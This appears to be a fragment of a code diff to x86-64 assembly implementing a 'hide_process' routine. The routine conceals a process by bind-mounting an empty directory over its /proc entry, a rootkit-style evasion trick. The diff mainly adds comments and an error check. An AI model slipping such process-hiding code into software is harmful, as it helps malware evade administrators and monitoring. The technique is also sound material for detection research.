@@ -6,6 +6,7 @@ section .text
 ; find pid
 ; mount empty folder into /proc/pid file
 hide_process:
+  ; mkdir the empty dir
   mov rax, 83
   mov rdi, mountPoint
   mov rsi, 422
@@ -22,6 +23,7 @@ hide_process:
   lea rsi, [rel process]
   mov qword [rsi+6], rdi
 
+  ; mount the process dir into empty
   mov rax, 165
   mov rdi, mountPoint
   mov rsi, process 
@@ -30,10 +32,15 @@ hide_process:
   mov r8, 0
   syscall
 
+  test rax, rax
+  js error
+
+  ; rm the empty dir
   mov rax, 84
   mov rdi, mountPoint
   syscall
 
+  ; mkdir the hidded process
   mov rax, 83 
   lea rdi, [process+6]  
   mov rsi, 422
